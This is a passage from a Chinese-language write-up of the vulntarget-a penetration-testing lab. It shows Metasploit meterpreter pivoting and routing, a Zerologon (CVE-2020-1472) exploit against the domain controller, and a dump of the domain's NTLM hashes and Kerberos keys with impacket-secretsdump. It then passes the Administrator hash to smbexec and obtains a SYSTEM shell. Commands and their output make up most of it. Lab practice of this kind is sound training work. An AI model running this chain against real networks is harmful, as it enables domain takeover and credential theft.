class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>注意</div><div class="admonitionContent_BuS1"><p>这里遇到比较大的问题，就是 socks 代理的不稳定问题</p><p>个人建议，直接使用 metasploit 全程打下来，不要使用其他隧道工具</p><p>先将 <code>win7</code> 使用 <code>windows/x64/meterpreter/reverse_tcp</code> 持久化</p><p>然后运行 <code>run post/multi/manage/autoroute</code> 做内网路由</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[*] Running module against WIN7-PC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Searching for subnets to autoroute.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Route added to subnet 10.0.20.0/255.255.255.0 from host&#x27;s routing table.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Route added to subnet 192.168.200.0/255.255.255.0 from host&#x27;s routing table.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Route added to subnet 169.254.0.0/255.255.0.0 from Bluetooth vc6.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>然后直接连接 <code>win2016</code> 的 <code>windows/x64/meterpreter/bind_tcp</code> 做持久化，再执行一次内网路由</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[*] Running module against WIN2016</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Searching for subnets to autoroute.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Route added to subnet 10.0.10.0/255.255.255.0 from host&#x27;s routing table.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>最后的 sessions 应该会是</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; sessions</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Active sessions</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">===============</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Id  Name  Type                     Information                    Connection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  --  ----  ----                     -----------                    ----------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN7-PC  192.168.200.129:3333 -&gt; 192.168.200.10:50706 (192.168.200.10)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN2016  10.0.20.98:50730 -&gt; 10.0.20.99:4444 via session 1 (10.0.20.99)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="win2019-域哈希收集">win2019 域哈希收集<a href="#win2019-域哈希收集" class="hash-link" aria-label="win2019 域哈希收集的直接链接" title="win2019 域哈希收集的直接链接">​</a></h2>
<p>使用<a href="https://github.com/dirkjanm/CVE-2020-1472" target="_blank" rel="noopener noreferrer">dirkjanm/CVE-2020-1472: PoC for Zerologon - all research credits go to Tom Tervoort of Secura</a></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ proxychains python3 cve-2020-1472-exploit.py WIN2019 10.0.10.110</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] config file found: /etc/proxychains4.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] DLL init: proxychains-ng 4.17</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Performing authentication attempts...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:135  ...  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:49674  ...  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">==========================================================================================================================================================================================================================================================================</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Target vulnerable, changing account password to empty string</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Result: 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Exploit complete!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>成功更改账户密码之后，获取域哈希信息</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ proxychains -q impacket-secretsdump vulntarget.com/WIN2019\$@10.0.10.110 -no-pass</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a3dd8e4a352b346f110b587e1d1d1936:::</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vulntarget.com\win2016:1601:aad3b435b51404eeaad3b435b51404ee:dfc8d2bfa540a0a6e2248a82322e654e:::</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WIN2019$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WIN2016$:1602:aad3b435b51404eeaad3b435b51404ee:2b6d27b1fbbad9f1e6413f972dec61ef:::</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Kerberos keys grabbed</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Administrator:aes256-cts-hmac-sha1-96:70a1edb09dbb1b58f1644d43fa0b40623c014b690da2099f0fc3a8657f75a51d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Administrator:aes128-cts-hmac-sha1-96:04c435638a00755c0b8f12211d3e88a1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Administrator:des-cbc-md5:dcc29476a789ec9e</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">krbtgt:aes256-cts-hmac-sha1-96:f7a968745d4f201cbeb73f4b1ba588155cfd84ded34aaf24074a0cfe95067311</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">krbtgt:aes128-cts-hmac-sha1-96:f401ac35dc1c6fa19b0780312408cded</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">krbtgt:des-cbc-md5:10efae67c7026dbf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vulntarget.com\win2016:aes256-cts-hmac-sha1-96:e4306bef342cd8215411f9fc38a063f5801c6ea588cc2fee531342928b882d61</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vulntarget.com\win2016:aes128-cts-hmac-sha1-96:6da7e9e046c4c61c3627a3276f5be855</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vulntarget.com\win2016:des-cbc-md5:6e2901311c32ae58</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WIN2019$:aes256-cts-hmac-sha1-96:092c877c3b20956347d535d91093bc1eb16b486b630ae2d99c0cf15da5db1390</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WIN2019$:aes128-cts-hmac-sha1-96:0dca147d2a216089c185d337cf643e25</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WIN2019$:des-cbc-md5:01c8894f541023bc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WIN2016$:aes256-cts-hmac-sha1-96:70d999981306f90f6570a7cf59f3e1189e7ba84a9bced5b4e9843b4ebd5149b5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WIN2016$:aes128-cts-hmac-sha1-96:3490377bc717cc13f3075a1ca7cf4ba0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WIN2016$:des-cbc-md5:863d8f7c9846c8fe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Cleaning up... </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>得到域哈希信息之后，就可以拿下DC的Administrator</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ proxychains impacket-smbexec -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 Administrator@10.0.10.110 -codec gbk</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] config file found: /etc/proxychains4.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] DLL init: proxychains-ng 4.17</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] DLL init: proxychains-ng 4.17</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] DLL init: proxychains-ng 4.17</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:445  ...  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[!] Launching semi-interactive shell - Careful what you execute</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\Windows\system32&gt;whoami</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nt authority\system</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="reference">Reference<a href="#reference" class="hash-link" aria-label="Reference的直接链接" title="Reference的直接链接">​</a></h2>
<p><a href="https://xz.aliyun.com/t/12422?time__1311=GqGxRQ0%3DEx9DlrzG7bGOYD8jEQAKqwod3x" target="_blank" rel="noopener noreferrer">渗透靶场 - vulntarget-a 综合靶场 - 先知社区</a></p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/Vulntarget/vulntarget-a/index.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>编辑此页</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/Target-Machines-WriteUp/docs/category/Vulntarget"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Vulntarget</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/Target-Machines-WriteUp/docs/Independent-Environment/Vulntarget/vulntarget-b/"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">vulntarget-b</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#简介" class="table-of-contents__link toc-highlight">简介</a></li><li><a href="#入口探测" class="table-of-contents__link toc-highlight">入口探测</a></li><li><a href="#通达-oa-文件上传" class="table-of-contents__link toc-highlight">通达 OA 文件上传</a></li><li><a href="#win7-持久化" class="table-of-contents__link toc-highlight">win7 持久化</a></li><li><a href="#建立内网代理" class="table-of-contents__link toc-highlight">建立内网代理</a></li><li><a href="#内网扫描" class="table-of-contents__link toc-highlight">内网扫描</a></li><li><a href="#win2016-redis-未授权" class="table-of-contents__link toc-highlight">win2016 redis 未授权</a></li><li><a href="#win2016-持久化" class="table-of-contents__link toc-highlight">win2016 持久化</a></li><li><a href="#域信息收集" class="table-of-contents__link toc-highlight">域信息收集</a></li><li><a href="#建立二层内网代理" class="table-of-contents__link toc-highlight">建立二层内网代理</a></li><li><a href="#win2019-侦察" class="table-of-contents__link toc-highlight">win2019 侦察</a></li><li><a href="#win2019-域哈希收集" class="table-of-contents__link toc-highlight">win2019 域哈希收集</a></li><li><a href="#reference" class="table-of-contents__link toc-highlight">Reference</a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2024 TryHackMyOffsecBox 🇨🇳 Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>